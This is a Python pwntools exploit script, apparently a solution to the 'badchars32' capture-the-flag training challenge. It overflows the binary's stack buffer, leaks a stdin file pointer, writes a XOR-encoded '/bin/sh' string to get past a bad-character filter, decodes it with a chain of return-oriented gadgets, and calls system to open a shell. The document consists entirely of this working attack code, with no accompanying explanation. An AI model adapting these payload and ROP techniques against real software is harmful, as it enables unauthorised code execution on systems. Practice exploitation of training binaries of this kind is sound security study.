#!/usr/bin/env python

from pwn import *

context.binary = './badchars32'
context.log_level = 'debug'

io = process('./badchars32')
elf = ELF('./badchars32')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

command = "/bin/sh\x00"
command = list(command)
#encrypt to escape badchars
xor = 0x80
input = []
for i in xrange(len(command)):
    input.append(chr(xor^ord(command[i])))
input = ''.join(input)

#leak Stdin_addr file Pointer 
io.recvuntil('\n> ')
payload1 = 'A'*(0x28+4)
payload1 += p32(elf.plt['puts'])
payload1 += p32(elf.symbols['pwnme'])
payload1 += p32(0x804A060)
io.sendline(payload1)
File_STDIN = u32(io.recv(4))
log.info('File_STDIN:'+hex(File_STDIN))

#input encrypted string to 0x804A130
io.recvuntil('\n> ')
payload2 = 'A'*(0x28+4)
payload2 += p32(elf.plt['fgets'])
payload2 += p32(elf.symbols['pwnme'])
payload2 += p32(0x804A130)+p32(0x80)+p32(File_STDIN)
io.sendline(payload2)
io.sendline(''.join(input))

#decrypt string ,get '/bin/sh'
io.recvuntil('\n> ')
payload3 ='A'*(0x28+4)
for index in range(len(input)):
    payload3 += p32(0x8048896)
    payload3 += p32(0x804A130+index)+p32(0x80)
    payload3 += p32(0x8048890)
payload3 +=p32(elf.symbols['pwnme'])
io.sendline(payload3)

#spawn shell
io.recvuntil('\n> ')
payload4 = 'A'*(0x28+4)
payload4 += p32(elf.plt['system'])
payload4 +='A'*4
payload4 += p32(0x804A130)
io.sendline(payload4)

io.interactive()
